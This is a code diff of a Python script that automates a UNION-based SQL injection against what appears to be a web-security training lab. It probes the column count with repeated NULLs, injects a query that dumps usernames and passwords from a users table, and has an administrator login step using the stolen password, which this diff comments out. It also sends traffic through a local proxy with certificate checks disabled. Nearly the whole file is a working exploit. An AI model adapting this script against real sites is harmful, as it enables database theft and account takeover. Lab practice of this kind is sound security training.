@@ -1,11 +1,12 @@
 import requests
 from bs4 import BeautifulSoup
-url = 'https://0aed006704596a1380c7cb1c002e0091.web-security-academy.net/'
+url = 'https://0ae9006604c93b64802d2b88008d009b.web-security-academy.net/'
 
 response = requests.get(url)
 
+proxies = {'http':'http://127.0.0.1:8081','https':'http://127.0.0.1:8081'}
 
-url = 'https://0aed006704596a1380c7cb1c002e0091.web-security-academy.net/filter?category=\'%20UNION%20SELECT'
+url = 'https://0ae9006604c93b64802d2b88008d009b.web-security-academy.net/filter?category=\'%20UNION%20SELECT'
 # print(response.text)
 # print(response)
 
@@ -14,7 +15,7 @@ fullurl = ''
 count = 1
 while True:
     fullurl = url + temp
-    response=requests.get(fullurl)
+    response=requests.get(fullurl,proxies=proxies, verify=False)
     print(fullurl)
     print(response.status_code)
     if response.status_code == 200:
@@ -22,12 +23,12 @@ while True:
     temp = "%20NULL," + temp
     count = count + 1
 
-url = url + "%20username,password%20FROM%20users--"
-response=requests.get(url)
-print(response.text)
+url = url + "%20NULL,%20username||\' \'||password%20FROM%20users--"
+response=requests.get(url,proxies=proxies, verify=False)
+# print(response.text)
 
 soup = BeautifulSoup(response.text, 'html.parser')
-table = soup.find('table', class_='is-table-longdescription')
+table = soup.find('table', class_='is-table-list')
 rows = table.find_all('tr')
 
 headers = {
@@ -54,15 +55,16 @@ headers = {
 
 for row in rows:
     cells=row.find_all('th')
-    username = cells[0].text.strip()
-    print(f"Username: {username}")
+    print(cells[0].text.strip())
+    # username = cells[0].text.strip()
+    # print(f"Username: {username}")
 
-    cells = row.find_all('td')
-    password = cells[0].text.strip()
-    print(f"Password: {password}")
+    # cells = row.find_all('td')
+    # password = cells[0].text.strip()
+    # print(f"Password: {password}")
 
-    if(username == 'administrator'):
-        login_url = 'https://0aed006704596a1380c7cb1c002e0091.web-security-academy.net/login'
-        payload = {'csrf': '9y0WWbdnDuzyZfpBL0ZdTXfYjyaiHsyt', 'username': username, 'password': password}
-        login_response = requests.post(login_url,headers=headers, data=payload)
-        print(login_response)
+    # if(username == 'administrator'):
+    #     login_url = 'https://0ae9006604c93b64802d2b88008d009b.web-security-academy.net/'
+    #     payload = {'csrf': '9y0WWbdnDuzyZfpBL0ZdTXfYjyaiHsyt', 'username': username, 'password': password}
+    #     login_response = requests.post(login_url,headers=headers, data=payload)
+    #     print(login_response)
